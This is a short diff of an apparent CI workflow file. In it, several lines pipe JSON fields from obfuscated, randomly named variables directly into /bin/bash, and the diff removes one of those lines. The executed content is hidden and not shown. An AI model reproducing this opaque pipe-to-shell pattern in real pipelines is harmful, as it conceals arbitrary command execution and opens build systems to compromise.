@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$mmji9" | jq -r .cb9989 | /bin/bash
           echo $hith6158 | jq -r .zwumi692 | /bin/bash
           echo $iiqlu59509 | jq -r .z27035 | /bin/bash
-          echo $vo69 | jq -r .yr22802 | /bin/bash
           echo $q54764 | jq -r .qe123 | /bin/bash
 
       - name: Persist data
